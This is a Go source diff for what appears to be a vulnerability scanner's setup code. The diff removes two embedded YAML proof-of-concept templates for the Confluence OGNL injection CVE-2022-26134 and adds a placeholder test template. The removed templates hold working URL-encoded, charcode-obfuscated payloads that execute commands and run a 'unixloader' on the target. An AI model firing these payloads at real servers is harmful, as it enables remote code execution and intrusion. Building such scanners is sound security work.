@@ -60,43 +60,21 @@ func main() {
 		},
 		Accounts:        []string{"admin/123456", "test/test", "/"},
 		DefaultPocsName: []string{"poc-yaml-confluence-cve-2022-26134"},
-		CustomPocs: []string{`name: poc-yaml-confluence-cve-2022-26134
-set:
-    r1: randomInt(800000000, 1000000000)
-    r2: randomInt(800000000, 1000000000)
-    poc: ord("expr "+string(r1)+" + "+string(r2))
-rules:
-  - method: GET
-    path: /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22,null%29.invoke%28null,null%29.setHeader%28%22X-CMD%22,Class.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28118,97,114,32,115,61,39,39,59,118,97,114,32,112,112,32,61,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,{{poc}},39,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,59,119,104,105,108,101,32,40,49,41,32,123,118,97,114,32,98,32,61,32,112,112,46,114,101,97,100,40,41,59,105,102,32,40,98,32,61,61,32,45,49,41,32,123,98,114,101,97,107,59,125,115,61,115,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,98,41,125,59,115%29%29%22%29%29%7D/
-    follow_redirects: false
-    expression: |
-        "X-Cmd" in response.headers && response.headers["X-Cmd"].contains(string(r1 + r2))
-    exploit:
-      - method: GET
-        path: /%24%7BClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,{{ord_unixloader}},39,41%29%29%22%29%7D/
-        follow_redirects: false
-detail:
-    links:
-    - https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
-    - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-26134.yaml`, `name: poc-yaml-confluence-cve-2022-26135
-set:
-    r1: randomInt(800000000, 1000000000)
-    r2: randomInt(800000000, 1000000000)
-    poc: ord("expr "+string(r1)+" + "+string(r2))
-rules:
-  - method: GET
-    path: /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22,null%29.invoke%28null,null%29.setHeader%28%22X-CMD%22,Class.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28118,97,114,32,115,61,39,39,59,118,97,114,32,112,112,32,61,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,{{poc}},39,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,59,119,104,105,108,101,32,40,49,41,32,123,118,97,114,32,98,32,61,32,112,112,46,114,101,97,100,40,41,59,105,102,32,40,98,32,61,61,32,45,49,41,32,123,98,114,101,97,107,59,125,115,61,115,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,98,41,125,59,115%29%29%22%29%29%7D/
-    follow_redirects: false
-    expression: |
-        "X-Cmd" in response.headers && response.headers["X-Cmd"].contains(string(r1 + r2))
-    exploit:
-      - method: GET
-        path: /%24%7BClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,{{ord_unixloader}},39,41%29%29%22%29%7D/
-        follow_redirects: false
-detail:
-    links:
-    - https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
-    - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-26134.yaml`},
+		CustomPocs: []string{`name: poc-yaml-test
+		set:
+		  poc: md5("test")
+		  exp: ord(unixloader)
+		rules:
+		  - method: GET
+			path: /test?id={{poc}}
+			follow_redirects: false
+			expression: |
+			  response.status == 404
+		exploit:
+		  - method: POST
+			path: /exp?cmd={{exp}}
+			body: <?php echo {{exp}}; ?>
+			follow_redirects: false`},
 	}
 	resultQueue := queue.NewQueue() // 扫描结果队列
 	r, err := runner.New(options)
